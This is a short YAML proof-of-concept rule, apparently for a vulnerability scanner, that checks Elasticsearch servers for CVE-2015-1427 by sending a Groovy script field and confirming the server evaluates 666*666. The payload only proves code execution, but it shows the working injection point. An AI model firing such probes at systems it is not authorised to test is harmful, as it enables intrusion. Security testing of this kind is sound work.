name: poc-yaml-elasticsearch-cve-2015-1427
rules:
  - method: POST
    path: /website/blog/
    body: |-
      {
        "name": "testpupupu"
      }
    follow_redirects: false
    expression: |
      status == 201 && body.bcontains(b'true')
  - method: POST
    path: /_search?pretty
    body: |-
      {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "666*666+'qaq'"}}}
    follow_redirects: false
    expression: |
      status == 200 && body.bcontains(b'443556qaq')
detail:
  links:
    - https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427